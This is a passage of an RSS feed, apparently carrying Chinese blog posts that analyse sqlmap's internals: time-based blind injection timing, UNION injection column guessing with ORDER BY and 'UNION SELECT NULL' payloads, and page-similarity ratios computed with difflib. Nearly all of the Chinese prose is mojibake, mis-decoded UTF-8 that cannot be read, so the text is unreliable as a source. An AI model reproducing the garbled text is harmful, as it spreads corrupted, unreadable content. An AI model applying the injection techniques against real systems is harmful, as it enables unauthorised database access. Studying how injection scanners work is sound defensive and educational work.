‡å‡†å·®ï¼Œä»£è¡¨è¿™äº›æ•°å€¼è¾ƒæ¥è¿‘å¹³å‡å€¼ã€‚ä¾‹å¦‚ï¼Œä¸¤ç»„æ•°çš„é›†åˆ{0, 5, 9, 14}å’Œ{5, 6, 8, 9}å…¶å¹³å‡å€¼éƒ½æ˜¯7ï¼Œä½†ç¬¬äºŒä¸ªé›†åˆå…·æœ‰è¾ƒå°çš„æ ‡å‡†å·®ã€‚è¿°â€œç›¸å·®kä¸ªæ ‡å‡†å·®â€ï¼Œå³åœ¨ XÌ„ Â± kS çš„æ ·æœ¬ï¼ˆSampleï¼‰èŒƒå›´å†…è€ƒé‡ã€‚æ ‡å‡†å·®å¯ä»¥å½“ä½œä¸ç¡®å®šæ€§çš„ä¸€ç§æµ‹é‡ã€‚ä¾‹å¦‚åœ¨ç‰©ç†ç§‘å­¦ä¸­ï¼Œåšé‡å¤æ€§æµ‹é‡æ—¶ï¼Œæµ‹é‡æ•°å€¼é›†åˆçš„æ ‡å‡†å·®ä»£è¡¨è¿™äº›æµ‹é‡çš„ç²¾ç¡®åº¦ã€‚å½“è¦å†³å®šæµ‹é‡å€¼æ˜¯å¦ç¬¦åˆé¢„æµ‹å€¼ï¼Œæµ‹é‡å€¼çš„æ ‡å‡†å·®å æœ‰å†³å®šæ€§é‡è¦è§’è‰²ï¼šå¦‚æœæµ‹é‡å¹³å‡å€¼ä¸é¢„æµ‹å€¼ç›¸å·®å¤ªè¿œï¼ˆåŒæ—¶ä¸æ ‡å‡†å·®æ•°å€¼åšæ¯”è¾ƒï¼‰ï¼Œåˆ™è®¤ä¸ºæµ‹é‡å€¼ä¸é¢„æµ‹å€¼äº’ç›¸çŸ›ç›¾ã€‚è¿™å¾ˆå®¹æ˜“ç†è§£ï¼Œå› ä¸ºå¦‚æœæµ‹é‡å€¼éƒ½è½åœ¨ä¸€å®šæ•°å€¼èŒƒå›´ä¹‹å¤–ï¼Œå¯ä»¥åˆç†æ¨è®ºé¢„æµ‹å€¼æ˜¯å¦æ­£ç¡®ã€‚&lt;/blockquote&gt;&lt;p&gt;æ ¹æ®æ³¨é‡Šå’Œæ‰¹æ³¨ä¸­çš„è§£é‡Šï¼Œæˆ‘ä»¬å‘ç°æˆ‘ä»¬éœ€è¦è®¾å®šä¸€ä¸ªæœ€å° SLEEPTIME åº”è¯¥è‡³å°‘å¤§äº &lt;code class=&quot;inline&quot;&gt;æ ·æœ¬å†…å¹³å‡å“åº”æ—¶é—´ + 7 * æ ·æœ¬æ ‡å‡†å·®&lt;/code&gt;ï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯è¿‡æ»¤æ‰ &lt;code class=&quot;inline&quot;&gt;99.99%&lt;/code&gt; çš„æ— å»¶è¿Ÿè¯·æ±‚ã€‚&lt;/p&gt;&lt;p&gt;å½“ç„¶é™¤äº†è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¿˜å‘ç°&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
delta = threadData.lastQueryDuration - conf.timeSec
if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):  # MySQL&#39;s SLEEP(X) lasts 0.05 seconds shorter on average
    delta += 0.05
return delta &amp;gt;= 0&lt;/code&gt;&lt;p&gt;è¿™ä¸€æ®µä»£ç ä½œä¸º mysql çš„ Patch å­˜åœ¨ &lt;code class=&quot;inline&quot;&gt;# MySQL&#39;s SLEEP(X) lasts 0.05 seconds shorter on average&lt;/code&gt;ã€‚&lt;/p&gt;&lt;p&gt;å¦‚æœæˆ‘ä»¬è¦è‡ªå·±å®ç°æ—¶é—´ç›²æ³¨çš„æ£€æµ‹çš„è¯ï¼Œè¿™ä¸€ç‚¹ä¹Ÿæ˜¯å¿…é¡»æ³¨æ„å’Œå®ç°çš„ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;é’ˆå¯¹ UNION å‹ï¼ˆUNION Queryï¼‰&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;UNION æ³¨å…¥å¯ä»¥è¯´æ˜¯ sqlmap ä¸­æœ€å¤æ‚çš„äº†ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æœ€ç»å…¸çš„æ³¨å…¥æƒ…å½¢ã€‚&lt;/p&gt;&lt;p&gt;å…¶å®å…³äº UNION æ³¨å…¥çš„æ£€æµ‹ï¼Œå’Œæˆ‘ä»¬ä¸€å¼€å§‹å­¦ä¹  SQL æ³¨å…¥çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼ŒçŒœè§£åˆ—æ•°ï¼ŒçŒœè§£è¾“å‡ºç‚¹åœ¨åˆ—ä¸­ä½ç½®ã€‚å®é™…åœ¨ sqlmap ä¸­ä¹Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªæ¥è¿›è¡Œæ¼æ´æ£€æµ‹çš„ï¼Œå…·ä½“çš„æµ‹è¯•æ–¹æ³•ä½äºï¼š&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-110a1145556b933e5ac2e73ff298f714_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;833&quot; data-rawheight=&quot;526&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-110a1145556b933e5ac2e73ff298f714&quot; data-watermark-src=&quot;v2-f370bebaeaefc7c866ba0c982e1a2c68&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;è·Ÿå…¥ &lt;code class=&quot;inline&quot;&gt;unionTest()&lt;/code&gt; ä¸­æˆ‘ä»¬å‘ç°å¦‚ä¸‹æ“ä½œ&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
def unionTest(comment, place, parameter, value, prefix, suffix):
    &quot;&quot;&quot;
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 3*50 times
    &quot;&quot;&quot;
â€‹
    if conf.direct:
        return
â€‹
    kb.technique = PAYLOAD.TECHNIQUE.UNION
    validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)
â€‹
    if validPayload:
        validPayload = agent.removePayloadDelimiters(validPayload)
â€‹
    return validPayload, vector&lt;/code&gt;&lt;p&gt;æœ€æ ¸å¿ƒçš„é€»è¾‘ä½äº &lt;code class=&quot;inline&quot;&gt;_unionTestByCharBruteforce&lt;/code&gt; ä¸­ï¼Œç»§ç»­è·Ÿå…¥ï¼Œæˆ‘ä»¬å‘ç°å…¶æ£€æµ‹çš„å¤§è‡´é€»è¾‘å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c529ff3eaf28512368b2b2045da53140_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1501&quot; data-rawheight=&quot;674&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c529ff3eaf28512368b2b2045da53140&quot; data-watermark-src=&quot;v2-6e6e8a25b589fb0a620495fd84a30b6d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;åˆ«æ€¥ï¼Œæˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥åˆ†æï¼&lt;/p&gt;&lt;h2&gt;&lt;b&gt;çŒœåˆ—æ•°&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æˆ‘ç›¸ä¿¡åšè¿‡æ¸—é€æµ‹è¯•çš„è¯»è€…åŸºæœ¬å¯¹è¿™ä¸ªè¯éƒ½éå¸¸éå¸¸ç†Ÿæ‚‰ï¼Œå¦‚æœæœ‰ç–‘é—®æˆ–è€…ä¸æ¸…æ¥šçš„è¯·è‡ªè¡Œç™¾åº¦ï¼Œç¬”è€…å†æ¬¡ä¸å†èµ˜è¿°å…³äº SQL æ³¨å…¥åŸºæœ¬æµç¨‹çš„éƒ¨åˆ†ã€‚&lt;/p&gt;&lt;p&gt;ä¸ºä»€ä¹ˆè¦æŠŠä¸€ä»¶è¿™ä¹ˆç®€å•çš„äº‹æƒ…å•ç‹¬æ‹¿å‡ºæ¥è¯´å‘¢ï¼Ÿå½“ç„¶è¿™é¢„ç¤ºç€ sqlmap å¹¶ä¸æ˜¯éå¸¸ç®€å•çš„åœ¨å¤„ç†è¿™ä¸€ä»¶äº‹æƒ…ï¼Œå› ä¸ºä½œä¸ºä¸€ä¸ªæ¸—é€æµ‹è¯•äººå‘˜ï¼Œå½“ç„¶å¯ä»¥å¾ˆå®¹æ˜“é è‚‰çœ¼åˆ†è¾¨å‡ºå¾ˆå¤šäº‹æƒ…ï¼Œä½†æ˜¯è¿™äº›äº‹æƒ…åœ¨è®¡ç®—æœºçœ‹æ¥å´å¹¶ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“å¯ä»¥åˆ¤æ–­çš„ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;ä½¿ç”¨ ORDER BY æŸ¥è¯¢ï¼Œç›´æ¥é€šè¿‡ä¸æ¨¡ç‰ˆé¡µé¢çš„æ¯”è¾ƒæ¥è·å–åˆ—æ•°ã€‚&lt;/li&gt;&lt;li&gt;å½“ ORDER BY å¤±æ•ˆçš„æ—¶å€™ï¼Œä½¿ç”¨å¤šæ¬¡ &lt;code class=&quot;inline&quot;&gt;UNION SELECT&lt;/code&gt; ä¸åŒåˆ—æ•°ï¼Œè·å–å¤šä¸ª Ratioï¼Œé€šè¿‡åŒºåˆ† Ratio æ¥åŒºåˆ†å“ªä¸€ä¸ªæ˜¯æ­£ç¡®çš„åˆ—æ•°ã€‚&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;å®é™…åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œ&lt;code class=&quot;inline&quot;&gt;ORDER BY&lt;/code&gt; çš„æ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼Œå…³äºå…¶ä¸­é¡µé¢æ¯”è¾ƒæŠ€æœ¯æˆ‘ä»¬å°±ä¸èµ˜è¿°äº†ï¼Œä¸è¿‡å€¼å¾—ä¸€æçš„æ˜¯ sqlmap åœ¨çŒœåˆ—æ•°çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯äºŒåˆ†æ³•ï¼ˆç¬”è€…çœ‹äº†ä¸€ä¸‹ï¼ŒäºŒåˆ†æ³•è¿™éƒ¨åˆ†è¿™ä¼¼ä¹æ˜¯ä¸ƒå¹´å‰çš„ä»£ç ï¼‰ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c8fa713e11133d2c091345e8dc9fc2a5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1349&quot; data-rawheight=&quot;631&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c8fa713e11133d2c091345e8dc9fc2a5&quot; data-watermark-src=&quot;v2-16cf9c8de071ee650d2e9c30bfd68109&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;é™¤æ­¤ä¹‹å¤–å‘¢ï¼Œå¦‚æœ &lt;code class=&quot;inline&quot;&gt;ORDER BY&lt;/code&gt; å¤±æ•ˆï¼Œå°†ä¼šè®¡ç®—è‡³å°‘äº”ä¸ªï¼ˆä» &lt;code class=&quot;inline&quot;&gt;lowerCount&lt;/code&gt; åˆ° &lt;code class=&quot;inline&quot;&gt;upperCount&lt;/code&gt;ï¼‰Payload ä¸º &lt;code class=&quot;inline&quot;&gt;UNION SELECT (NULL,) * [COUNT]&lt;/code&gt;ï¼Œçš„è¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚çš„å¯¹åº” RATIOï¼ˆä¸æ¨¡ç‰ˆé¡µé¢ç›¸ä¼¼åº¦ï¼‰ä¼šæ±‡æ€»å­˜å‚¨åœ¨ &lt;code class=&quot;inline&quot;&gt;ratios&lt;/code&gt; ä¸­ï¼ŒåŒæ—¶ &lt;code class=&quot;inline&quot;&gt;items&lt;/code&gt; ä¸­å­˜å‚¨ &lt;code class=&quot;inline&quot;&gt;åˆ—æ•° å’Œ ratio&lt;/code&gt; å½¢æˆçš„ &lt;code class=&quot;inline&quot;&gt;tuple&lt;/code&gt;ï¼Œç»è¿‡ä¸€ç³»åˆ—çš„ç®—æ³•ï¼Œå°½å¯èƒ½å¯»æ‰¾å‡ºâ€œä¸ä¼—ä¸åŒï¼ˆæ­£ç¡®çŒœåˆ°åˆ—æ•°ï¼‰â€çš„é¡µé¢ã€‚å…·ä½“çš„ç®—æ³•ä¸æ‰¹æ³¨å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9ece5b4a703e99bd41426ac3912dbe0e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1427&quot; data-rawheight=&quot;702&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9ece5b4a703e99bd41426ac3912dbe0e&quot; data-watermark-src=&quot;v2-b38dc8a4df45594a0df0b4d234fbf36a&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æˆ‘ä»¬å‘ç°ï¼Œä¸Šé¢ä»£ç è¡¨è¾¾çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯ &lt;b&gt;åˆ©ç”¨ä¸æ¨¡ç‰ˆé¡µé¢æ¯”è¾ƒçš„å†…å®¹ç›¸ä¼¼åº¦å¯»æ‰¾æœ€æœ€ä¸åŒçš„é‚£ä¸€ä¸ªè¯·æ±‚&lt;/b&gt;ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;å®šä½è¾“å‡ºç‚¹&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å‡å¦‚ä¸€åˆ‡é¡ºåˆ©ï¼Œæˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„æ­¥éª¤æˆåŠŸæ‰¾åˆ°äº†åˆ—æ•°ï¼Œæ¥ä¸‹æ¥å°±åº”è¯¥å¯»æ‰¾è¾“å‡ºç‚¹ï¼Œå½“ç„¶è¾“å‡ºç‚¹çš„å¯»æ‰¾ä¹Ÿæ˜¯éœ€è¦é¢å¤–è®¨è®ºçš„ã€‚å…¶å®åŸºæœ¬é€»è¾‘å¾ˆå®¹æ˜“å¯¹ä¸å¯¹ï¼Ÿæˆ‘ä»¬åªéœ€è¦å°† &lt;code class=&quot;inline&quot;&gt;UNION SELECT NULL, NULL, NULL, NULL, ...&lt;/code&gt; ä¸­çš„å„ç§ &lt;code class=&quot;inline&quot;&gt;NULL&lt;/code&gt; ä¾æ¬¡æ›¿æ¢ï¼Œç„¶ååœ¨ç»“æœä¸­å¯»æ‰¾è¢«æˆ‘ä»¬æ’å…¥çš„éšæœºçš„å­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥å¾ˆå®¹æ˜“å®šä½åˆ°è¾“å…¥å‡ºç‚¹çš„ä½ç½®ã€‚å®é™…ä¸Šè¿™ä¸€éƒ¨åˆ†çš„ç¡®è®¤é€»è¾‘æ˜¯ä½äºä¸‹å›¾ä¸­çš„å‡½æ•°çš„ &lt;code class=&quot;inline&quot;&gt;_unionConfirm&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e3b392f7ef6cd59242acadc60c82d38b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;783&quot; data-rawheight=&quot;441&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e3b392f7ef6cd59242acadc60c82d38b&quot; data-watermark-src=&quot;v2-98d8b68fa58780554eece325888eb731&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;å…¶ä¸­ä¸»è¦çš„é€»è¾‘æ˜¯ä¸€ä¸ªå« &lt;code class=&quot;inline&quot;&gt;_unionPosition&lt;/code&gt; çš„å‡½æ•°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œè´Ÿè´£å®šä½è¾“å‡ºç‚¹çš„ä½ç½®ï¼Œä½¿ç”¨çš„åŸºæœ¬æ–¹æ³•å°±æ˜¯æˆ‘ä»¬åœ¨å¼€å¤´æåˆ°æ–¹æ³•ï¼Œå—é™äºç¯‡å¹…ï¼Œæˆ‘ä»¬å°±ä¸å†å±•å¼€å™è¿°äº†ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 ç»“æŸè¯­&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å…¶å®æŒ‰ç¬”è€…åŸè®¡åˆ’ï¼Œæœ¬ç³»åˆ—æ–‡ç« å¹¶æ²¡æœ‰ç»“æŸï¼Œå› ä¸ºè¿˜æœ‰å…³äº sqlmap ä¸­å…¶ä»–æŠ€æœ¯æ²¡æœ‰ä»‹ç»ï¼šâ€œæ•°æ®æŒä¹…åŒ–â€ï¼Œâ€œaction() - Exploit æŠ€æœ¯â€ï¼Œâ€œå¸¸è§æ¼æ´åˆ©ç”¨åˆ†æï¼ˆudfï¼Œåå¼¹ shell ç­‰ï¼‰â€ã€‚ä½†æ˜¯ç”±äºå†…å®¹æ˜¯åœ¨å¤ªè¿‡åºæ‚ï¼Œç¬”è€…è®¡åˆ’æš‚ä¸”æç½®ä¸€ä¸‹ï¼Œå®é™…ä¸Šç°æœ‰çš„æ–‡ç« å·²ç»è¶³å¤ŸæŠŠ sqlmap çš„ SQL æ³¨å…¥æ£€æµ‹æœ€æ ¸å¿ƒçš„ä¹Ÿæ˜¯æœ€æœ‰æ„ä¹‰çš„è‡ªåŠ¨åŒ–é€»è¾‘è¯´æ¸…æ¥šäº†ï¼Œæˆ‘æƒ³è¯»è¯»è€…è¯»å®Œä¹‹åè‚¯å®šä¼šæœ‰è‡ªå·±çš„æ”¶è·ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 å†è§ğŸ‘‹&lt;/b&gt;&lt;/h2&gt;</description>
<author>å°è˜‘è‡</author>
<guid isPermaLink="false">2018-09-25-45291193</guid>
<pubDate>Tue, 25 Sep 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>sqlmap å†…æ ¸åˆ†æ II: æ ¸å¿ƒåŸç†-é¡µé¢ç›¸ä¼¼åº¦ç®—æ³•å®è·µ</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-10-44157153.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/44157153&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8189a97bf692ad57084cd2d670824522_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;ä½œè€…ï¼š &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt;&lt;/p&gt;&lt;p&gt;å®‰å…¨ç ”å‘å·¥ç¨‹å¸ˆï¼Œç°å°±èŒäºé•¿äº­ç§‘æŠ€ï¼Œå–œæ¬¢å–µå–µ&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬åœ¨ &lt;code class=&quot;inline&quot;&gt;checkWaf()&lt;/code&gt; ä¸­æˆ›ç„¶è€Œæ­¢äº &lt;code class=&quot;inline&quot;&gt;page ratio&lt;/code&gt; è¿™ä¸€ä¸ªæ¦‚å¿µï¼›ä½†æ˜¯åœ¨æœ¬æ–‡ï¼Œç¬”è€…ä¼šè¯¦ç»†ä»‹ç» &lt;code class=&quot;inline&quot;&gt;page ratio&lt;/code&gt; å¯¹äº sqlmap æ•´ä¸ªç³»ç»Ÿçš„é‡è¦æ„ä¹‰å’Œç”¨æ³•ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜ä¼šæŒ‡å‡ºä¸€äº› sqlmap çš„æ ¸å¿ƒé€»è¾‘å’Œä¸€äº›æ‹“å±•æ€§çš„åŠŸèƒ½ã€‚åŒ…å«ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;identityWaf&lt;/li&gt;&lt;li&gt;nullConnection (checkNullConnection)&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x00 PageRatio æ˜¯ä»€ä¹ˆï¼Ÿ&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è¦è¯´ PageRatio æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å…ˆä»‹ç»å¦ä¸€ä¸ªæ¨¡å— &lt;code class=&quot;inline&quot;&gt;difflib&lt;/code&gt;ã€‚è¿™ä¸ªæ¨¡å—æ˜¯åœ¨ sqlmap ä¸­ç”¨æ¥è®¡ç®—é¡µé¢çš„ç›¸ä¼¼åº¦çš„åŸºç¡€æ¨¡å—ï¼Œå®é™…å¤„ç†çš„æ—¶å€™ï¼Œsqlmap å¹¶ä¸ä»…ä»…æ˜¯ç›´æ¥è®¡ç®—é¡µé¢çš„ç›¸ä¼¼åº¦ï¼Œè€Œæ˜¯é€šè¿‡é¦–å…ˆå¯¹é¡µé¢è¿›è¡Œä¸€äº›é¢„å¤„ç†ï¼Œé¢„å¤„ç†ä¹‹åï¼Œæ ¹æ®é¢„è®¾çš„é˜ˆå€¼æ¥è®¡ç®—è¯·æ±‚é¡µé¢å’Œæ¨¡ç‰ˆé¡µé¢çš„ç›¸ä¼¼åº¦ã€‚&lt;/p&gt;&lt;p&gt;å¯¹äº &lt;code class=&quot;inline&quot;&gt;difflib&lt;/code&gt; æ¨¡å—å…¶å®æœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆéå¸¸ç‰¹æ®Šçš„ï¼Œè¯¦ç»†å‚è§&lt;a href=&quot;https://docs.python.org/2/library/difflib.html&quot;&gt;å®˜æ–¹æ‰‹å†Œ&lt;/a&gt;ï¼Œå®é™…åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œsqlmap ä¸»è¦ä½¿ç”¨å…¶ &lt;code class=&quot;inline&quot;&gt;SequenceMatcher&lt;/code&gt; è¿™ä¸ªç±»ã€‚ä»¥ä¸‹æ˜¯å…³äºè¿™ä¸ªç±»çš„ç®€å•ä»‹ç»ï¼š&lt;/p&gt;&lt;blockquote&gt;This is a flexible class for comparing pairs of sequences of any type, so long as the sequence elements are hashable. The basic algorithm predates, and is a little fancier than, an algorithm published in the late 1980â€™s by Ratcliff and Obershelp under the hyperbolic name â€œgestalt pattern matching.â€ The idea is to find the longest contiguous matching subsequence that contains no â€œjunkâ€ elements (the Ratcliff and Obershelp algorithm doesnâ€™t address junk). The same idea is then applied recursively to the pieces of the sequences to the left and to the right of the matching subsequence. This does not yield minimal edit sequences, but does tend to yield matches that â€œlook rightâ€ to people.&lt;/blockquote&gt;&lt;p&gt;ç®€å•æ¥è¯´è¿™ä¸ªç±»ä½¿ç”¨äº† Ratcliff å’Œ Obershelp æä¾›çš„ç®—æ³•ï¼ŒåŒ¹é…æœ€é•¿ç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œè®¾å®šæ— å…³å­—ç¬¦ï¼ˆjunkï¼‰ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œä»–ä»¬åº”ç”¨æœ€å¤šçš„æ–¹æ³•åº”è¯¥å°±æ˜¯ &lt;code class=&quot;inline&quot;&gt;ratio()&lt;/code&gt;ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e5dbeda98af8e9230aa17a3cdd8ceba7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1589&quot; data-rawheight=&quot;139&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ ¹æ®æ–‡æ¡£ä¸­çš„æè¿°ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸¤æ®µæ–‡æœ¬çš„ç›¸ä¼¼åº¦ï¼Œç›¸ä¼¼åº¦çš„ç®—æ³•å¦‚ä¸‹ï¼šæˆ‘ä»¬å‡è®¾ä¸¤æ®µæ–‡æœ¬åˆ†åˆ«ä¸º &lt;code class=&quot;inline&quot;&gt;text1&lt;/code&gt; ä¸ &lt;code class=&quot;inline&quot;&gt;text2&lt;/code&gt;ï¼Œä»–ä»¬ç›¸åŒçš„éƒ¨åˆ†é•¿åº¦æ€»å…±ä¸º &lt;code class=&quot;inline&quot;&gt;M&lt;/code&gt;ï¼Œè¿™ä¸¤æ®µæ–‡æœ¬é•¿åº¦ä¹‹å’Œä¸º &lt;code class=&quot;inline&quot;&gt;T&lt;/code&gt;ï¼Œé‚£ä¹ˆè¿™ä¸¤æ®µæ–‡æœ¬çš„ç›¸ä¼¼åº¦å®šä¹‰ä¸º &lt;code class=&quot;inline&quot;&gt;2.0 * M / T&lt;/code&gt;ï¼Œè¿™ä¸ªç›¸ä¼¼åº¦çš„å€¼åœ¨ 0 åˆ° 1.0 ä¹‹é—´ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;PageRatio çš„å°ä¾‹å­&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4ca7c268277f6f9afbe5b194d24796dc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;481&quot; data-rawheight=&quot;229&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4ca7c268277f6f9afbe5b194d24796dc&quot; data-watermark-src=&quot;v2-284abfab7f0d229fa22bf82cae412512&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„ä»‹ç»ï¼ŒçŸ¥é“äº†å¯¹äº &lt;code class=&quot;inline&quot;&gt;abcdefg&lt;/code&gt; å’Œ &lt;code class=&quot;inline&quot;&gt;abce123&lt;/code&gt; æˆ‘ä»¬è®¡ç®—çš„ç»“æœåº”è¯¥æ˜¯ &lt;code class=&quot;inline&quot;&gt;2.0 * 4 / 14&lt;/code&gt; æ‰€ä»¥è®¡ç®—ç»“æœåº”è¯¥æ˜¯ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33d7ed32fcaeee58a5f0b418666567f0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;233&quot; data-rawheight=&quot;37&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åˆ°ç°åœ¨æˆ‘ä»¬ç†è§£äº† PageRatio æ˜¯ä»€ä¹ˆæ ·çš„ä¸€ç§ç®—æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹è§‚å¯Ÿ sqlmap æ˜¯å¦‚ä½•ä½¿ç”¨è¿™ä¸€ä¸ªå€¼çš„äº†ï½&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 RATIO in checkWaf&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;åœ¨ä¸ŠèŠ‚çš„å†…å®¹ä¸­ï¼Œæˆ‘ä»¬å¯¹äº sqlmap çš„æºç äº†è§£åˆ° &lt;code class=&quot;inline&quot;&gt;checkWaf&lt;/code&gt; çš„éƒ¨åˆ†ï¼Œç»“åˆåˆšæ‰è®²çš„ PageRatio çš„ä¾‹å­ï¼Œæˆ‘ä»¬ç›´æ¥å¯ä»¥çœ‹æ‡‚è¿™éƒ¨åˆ†ä»£ç ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0daf035189288e98edbec8cf7cb500f8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1186&quot; data-rawheight=&quot;185&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;ç°åœ¨è®¾å®š &lt;code class=&quot;inline&quot;&gt;IDS_WAF_CHECK_RATIO = 0.5&lt;/code&gt; è¡¨æ˜ï¼Œåªè¦æ‰“äº†æ£€æµ‹ IDS/WAF çš„ Payload çš„é¡µé¢ç»“æœä¸æ¨¡ç‰ˆé¡µé¢ç»“æœæ–‡æœ¬é¡µé¢ç»è¿‡ä¸€å®šå¤„ç†ï¼Œæœ€åæ¯”è¾ƒå‡ºç›¸ä¼¼åº¦ç›¸å·® 0.5 å°±å¯ä»¥è®¤ä¸ºè§¦å‘äº† IDS/WAFã€‚&lt;/p&gt;&lt;p&gt;ä¸ &lt;code class=&quot;inline&quot;&gt;checkWaf&lt;/code&gt; ç›¸å…³çš„å…¶å®è¿˜æœ‰ &lt;code class=&quot;inline&quot;&gt;identityWaf&lt;/code&gt;, ä½†æ˜¯è¿™ä¸ªæ–¹æ³•å¤ªç®€å•äº†æˆ‘ä»¬å¹¶ä¸æƒ³ä»”ç»†åˆ†æï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡Œäº†è§£ä¸€ä¸‹ï¼Œæœ¬æ–‡é€‰æ‹©ç›´æ¥è·³è¿‡è¿™ä¸€ä¸ªæ­¥éª¤ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02 